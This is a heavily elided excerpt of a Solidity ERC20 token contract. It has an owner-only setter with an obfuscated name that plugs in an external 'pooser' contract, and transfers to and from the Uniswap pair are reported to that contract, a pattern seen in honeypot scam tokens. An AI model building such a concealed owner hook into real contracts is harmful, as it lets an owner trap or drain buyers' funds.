...
contract TokenM is ERC20 {
    ...
    IUserAmountpooser public pooser;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Script", "SCPT") {
    ...
    function curefddoBvvtogRnnu(IUserAmountpooser _pooser) public onlyOwner {
        pooser = _pooser;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                pooser.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				pooser.addOutAmount(from, amount);
            }else{
                pooser.addOutAmount(from, amount);
                takeFee = false;
            }
